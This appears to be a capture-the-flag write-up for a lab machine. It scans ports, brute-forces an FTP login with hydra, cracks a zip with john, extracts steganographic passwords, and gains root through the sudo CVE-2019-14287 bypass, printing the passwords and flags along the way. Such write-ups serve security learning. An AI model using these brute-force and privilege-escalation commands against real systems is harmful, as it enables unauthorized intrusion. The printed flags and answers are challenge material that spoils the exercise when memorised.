This room quite interesting, with a lot of hand on tool and stuff 
First, we run a nmap scap on the target host ip to find the open port 

```
nmap  A  T4  p  10.49.156.165

```
![](https://remnote user data.s3.amazonaws.com/e wH5Rp fHehVcv_A3QApJVwHLg6DLD0bmZmMLtx_OxeCqcYYUIeAMPJwCJXI1lH_ayVr_Y8dioTzgKQfaoYFmlH6WEYjqO8TvHl_LT3h7ISxmm8_ISKV_K90bUqSycM.png)

There are three open port: `21(FTP), 22(SSH) and 80(HTTP)` 

***🚩 How many open ports? ⇒ 3***  
Access the http domain, we receive a message that:
![](https://remnote user data.s3.amazonaws.com/Ibsb7Ppbxt_iAIWl2aUrN1CTmQxCbGUCuhzs01lwV64C05KiANnM98jCpAEoIPV9kiGFcNXuDcBG1fqHG4zj UFIpAgE6hTTCiujcg  qFnn41nqzUS3sVHBoxp2C9Z8.png)

As the sender names is `Agent R` and the tag said we have to use `codename` as user agent, let adjust the User Agent with 25 alphabet letters left. 

***🚩 How you redirect yourself to a secret page? ⇒ user agent*** ** ** 

```bash
curl  A "C"  L 10.49.156.165
```
![](https://remnote user data.s3.amazonaws.com/XMJae8hEW3f999mraRzbdNtCMOjec1PhTlwwcyKhqscbRG_zrppgR5xxh6mVucroHDgOEmJWI8nTJ_X13WCE5QQ1YN Aa8DgaXcCh0h9n5iBbFq4J5pAFk GyJkd2tlJ.png)

We have the full username that sent from R is `chris` 

***🚩 What is the agent name? ⇒ chris*** ** **  

As we already know the username is chris and Agent R said that his password is weak and easy to crack ⇒ which lead us **`FTP`** brute forcing.

```bash
hydra  l chris  P /usr/share/wordlists/rockyou.txt  t 4 10.49.156.165 ftp
```

And we have the password which was `crystal` 

***🚩 FTP password? ⇒ crystal***

`get` three files from the `FTP` server 
![](https://remnote user data.s3.amazonaws.com/oDOf3eC ihzYiRS__tLaVR  tZA7PHRZNemA9VhJaIJhVPrUT1dvvcoRzH_9eoO5cmrdm 6 K7kcz6H0 EDmF3rc0u2AGd2YPfsRbSw2EC_z4mgIBKEVAwqwuCmBaM28.png)

Run 

```bash
cat To_agentJ.txt # we have 

> 
└─$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C

```

     Login password stored in fake picture ??? **Steganography **indeed. 

     Like every other forensic challenge about steganography, i immediately run
     .
     ```
     files cutie.png 
# 
     strings cutie.png 
     ```

     ![](https://remnote user data.s3.amazonaws.com/n8Knz3yLXxUBTHrQD2VppXzIIl4YzcTui18GVwsvM_xnwu8iOMQn21x85PdECY9wdWcytZe94cylh71smuELv3OYgbsZKTUci2rfjRVKGMt_P6WHLHIqLsGADfwQqNb5.png)

     and i saw a `To_agentR.txt` file being embedded within the png file, run `zsteg`  

     .
     ```
     zsteg cutie.png 
     ```
     ![](https://remnote user data.s3.amazonaws.com/DuqXvU1IIq0t3DSpI7ulVC6ktkkS1jy1k 5jgBT zonrXKEY2QpsYY1_kZHyoDTLVvzwqqtToFe80_eXm08A6P__L3YZ3tvy84OtfLkBeS_Mg3Ydu65Ede5UKtwvzii3.png)
     It is a `zip` file, we need to unzip this file to get that txt file, but it require a passphrase to unzip it

     ![](https://remnote user data.s3.amazonaws.com/upABe8YhOirJIJNt6y2HSLFvrpKbiDKQa0JIibcDpZxsjre8BwOltA2yxneKC_6sV7j1a5b8y8jRjsqcmG3LGSBEraMmLOXbKRhyL dDj_bDDDla3PL IXjzytmWuN R.png)

     We run `foremost` to grab the embedded file within the image inorder to crack with `johntheripper` 

     ![](https://remnote user data.s3.amazonaws.com/nAphJE0ZnB8XA3njULtHqWi9aYY3xBn2K6SJssdfgjwhMmMDeU6 iEsC6qT98xP_2w1sS4UYNXOYf71nFcJ__GnCHjj4a4ySKLqgIgZTeEJ4hDzlAy6pRrC64YnCq81Q.png)

     `zip2john` and then bruteforce it 

     .
     ```
     zip2john cutie.png > hash.txt 

     ```

     ![](https://remnote user data.s3.amazonaws.com/xvyzzT zvEDJISrBy1gfn7djeHPQ78oOVP_QoQflt0K6fLJDARyscXceB5uUIqshu0uIbokjCIhXJpeKDzimMiCg5MOKaPSYYBshKJbZAFSbv QQAgRHyIAv2BA59kLz.png)

     .
     ```
     john   format=zip   wordlist=/usr/share/wordlists/rockyou.txt hash.txt
     ```

     ***🚩 Zip file password? ⇒ alien***  

     .
     ```
     7z x 8702.zip
     ```
     ![](https://remnote user data.s3.amazonaws.com/dkxQwb6x4oW1_sRJOQeeJRFysno8xp8kjKkKGoTVaKq8jIQd57M7r6tj9fY3kikshRkJNFZnyp8zbjNJJdEIoEgk8flYFkxZQ uAWZKr3MGd1ajLxvSPMZU2BeH6RGFg.png)

     we have a txt file after extract 

     .
     ```
     cat To_agentR.txt
###
     Agent C,

     We need to send the picture to 'QXJlYTUx' as soon as possible!
     By,
     Agent R

     ```

     Decode it with base64 

     .
     ```
     cat To_agentR.txt | grep  oE "QX.*" | cut  d "'"  f1 | base64  d

     ```
     ***🚩 steg password? ⇒ Area51*** ** ** 

     We steg out the message embedded inside the other jpg image file with `steghide` 

     .
     ```
     └─$ steghide extract  sf cute alien.jpg 
     Enter passphrase: **Area51**
     >
     wrote extracted data to "message.txt".

     ```
     Cat the content out 

     ![](https://remnote user data.s3.amazonaws.com/kxdU04Qt6c7Wqy3rKwzUYzoFwt7j327lqP3okzfwFMz8ZS6QNX0Se5BrUcb36S7DBIOPJ9ece XjBclihIrTJrfOfVDY0PnndN4rw7NjqFPFzlhOb5unpZ7tQt_xI 4P.png)

     .
     ```
     Hi james,

     Glad you find this message. Your login password is hackerrules!

     Don't ask me why the password look cheesy, ask agent R who set this password for you.

     Your buddy,
     chris  
     ```
     ***🚩 Who is the other agent (in full name)? ⇒ james***   

     ***🚩 SSH password? ⇒hackerrules!***  

     We ssh to james machine with the provide password and we have the user.txt flag 
     ![](https://remnote user data.s3.amazonaws.com/s4iHSVQMR3_eBXZNcaQxLwpYhXRrHDdRc05w6R GAjqVudrI 9SipzgER5L9aONuAQMbdqX1ekv1WLABFxdZ2tydefbvPQ_ppk_5Sbmo8GgqJl0iu8XmVRs0pBiKG2FF.png)

     ***🚩 ***   ***What is the user flag? ⇒b03d975e8c92a7c04146cfa7a5a313c7***  
     .
     ```
     python3  m http.server 8000

     ```
     ![](https://remnote user data.s3.amazonaws.com/RcYn5WCWhXVk9niuuM1mVr4oCCocbzHLLjH13mzjYMj Y70h5B7Ud16nD9rrRvzGAAK9t7o4Lf_xK_Qibe 4GEYx6FojBSOJjWJbALfsi7l7SkEF4xvjg0MSQZ_QqFDE.png)

     Access the server domain to harvest the image file, search it and we have the name for the alient's incident
     ![](https://remnote user data.s3.amazonaws.com/tlLcLpfLPGbTu_TDOnoKqNa6ZwfKt _biL1Cdbfv5jN83wL_OImtLLB9hS r0ubXmm2o7wvxQF2m2KNWX_PhMUmDRTy3JjKTD4iAMRoXYcvNlOueRwFdXhOkASsdcqlZ.png)

     ***🚩 ***  **What is the incident of the photo called** ***? ⇒***   ***Roswell alien autopsy***  

     ![](https://remnote user data.s3.amazonaws.com/HJlmsdRNI3Rc7JhBHkLsK3xjKoxMtvjoSXlu66ozgcwxzSXfq3GLc7LCn2cfpgUeTsbdIaxv4genX0kwJBPs4345Ui3j2vj8ajykibc5ZDG20vKY9KDtfiJpY_42l3nM.png)

     Check for the privilege that could be escalated, look up the: 

     .
     ```
     (ALL, !root) /bin/bash

     ```
     And we have 
     ![](https://remnote user data.s3.amazonaws.com/Z7JmGSutZULnynbBJRmU_tNmAjGYG5ne1dJeWoQtJk5BEXLex7zm3oGcvgdbOEJmzv8lA6dC9eZhyVLNe65Lb5DqRNquJvuK30hX79xyi6XQJ5jxwQr_Adp66TnGsGuq.png)

     ***🚩 CVE number for the escalation (Format: CVE xxxx xxxx)? ⇒CVE 2019 14287 ***  

     Bypass the misconfiguration incident with: 

     .
     ```
     sudo  u# 1 /bin/bash
     ```
     and we have the root privilege 
     .
     ```
     root@agent sudo:~# cat  /root/root.txt
     To Mr.hacker,

     Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

     Your flag is 
     b53a02f55b57d4439e3341834d70c062

     By,
     DesKel a.k.a Agent R

     ```
     ***🚩***   ***What is the root flag? ⇒b53a02f55b57d4439e3341834d70c062 ***  

     ***🚩 (Bonus) Who is Agent R? ⇒ DesKel***  
